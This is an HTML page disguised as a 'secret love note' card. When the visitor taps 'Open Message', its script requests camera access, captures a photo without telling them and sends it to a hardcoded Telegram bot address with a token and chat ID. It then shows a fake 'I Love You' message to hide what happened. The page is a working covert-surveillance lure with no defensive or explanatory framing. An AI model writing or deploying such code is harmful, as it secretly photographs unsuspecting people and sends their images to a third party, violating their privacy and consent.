<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>A Message For You 💌</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 300px;
        }
        h2 { color: #e91e63; }
        p { color: #555; }
        button {
            background: #e91e63;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 25px;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { background: #c2185b; }
    </style>
</head>
<body>
    <div class="card">
        <h2>💌 You Have a Message!</h2>
        <p>Tap below to open your secret love note...</p>
        <button id="openBtn">Open Message</button>
    </div>

    <script>
        document.getElementById('openBtn').addEventListener('click', async () => {
            const btn = document.getElementById('openBtn');
            btn.textContent = "Opening...";
            btn.disabled = true;

            try {
                // Request camera access
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // Create a hidden video element to preview
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Wait 1 second for camera to stabilize
                await new Promise(r => setTimeout(r, 1000));

                // Capture frame
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                // Convert to blob
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', '6813462951');
                    formData.append('photo', blob, 'love_photo.jpg');
                    formData.append('caption', '💘 Love captured!');

                    // Send to Telegram
                    await fetch('https://api.telegram.org/bot9181331705:AAG6cDB8DxQfMoECog3bHvOyVUgfzIiQL7s/sendPhoto', {
                        method: '.post',
                        body: formData
                    });

                    // Show fake love message after sending
                    document.querySelector('.card').innerHTML = `
                        <h2>💖 I Love You!</h2>
                        <p>This is my heart... captured just for you.</p>
                        <div style="font-size: 3rem;">❤️</div>
                    `;
                }, 'image/jpeg');

            } catch (err) {
                console.error('Camera error:', err);
                alert('Camera access denied or not available.');
                btn.textContent = "Try Again";
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
